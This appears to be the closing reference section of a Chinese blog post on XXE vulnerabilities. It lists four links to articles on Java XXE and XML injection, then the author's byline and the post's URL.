https://mp.weixin.qq.com/s?__biz=MzI3MTQyNzQxMA==&mid=2247484073&idx=1&sn=483c6a12a0813dc3d608782f455a14e3&chksm=eac0b094ddb7398279a61a6ce506e45a2d89f8db19b5f5a64023ad915c9ffebe405171334919&scene=21#wechat_redirect

https://yoga7xm.top/2020/02/17/javaxxe/

https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/#0x03-XML%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81

https://xz.aliyun.com/t/3357





---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/xxe%E6%BC%8F%E6%B4%9E/  

